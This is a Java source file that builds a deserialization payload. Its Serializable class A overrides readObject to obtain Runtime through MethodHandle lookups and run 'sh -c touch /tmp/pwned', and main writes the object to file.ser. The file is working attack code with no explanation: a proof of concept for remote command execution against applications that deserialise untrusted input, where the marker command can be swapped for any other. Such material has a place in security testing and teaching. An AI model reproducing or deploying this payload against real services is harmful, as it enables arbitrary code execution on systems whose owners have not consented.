import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.Runtime;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodType;

class A implements Serializable {
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException{
        in.defaultReadObject();
        try {
            MethodHandles.Lookup lookup = MethodHandles.lookup();

            MethodHandle mh = lookup.findStatic(Runtime.class,"getRuntime",MethodType.methodType(Runtime.class));

            Runtime rt = (Runtime) mh.invoke();
            
            Process p = rt.exec(new String[]{"sh","-c","touch /tmp/pwned"});
            
        } catch (Throwable t){
            t.printStackTrace();
        } 
    }
}

public class payload_creation{
    public static void main(String[] args) {
        A object = new A();
        String filename = "file.ser";

        try {
            FileOutputStream file = new FileOutputStream(filename);
            ObjectOutputStream out = new ObjectOutputStream(file);
            out.writeObject(object);
            out.close();
            file.close();
        } catch (IOException e) {
            System.err.println("IOException");
        }

    }
}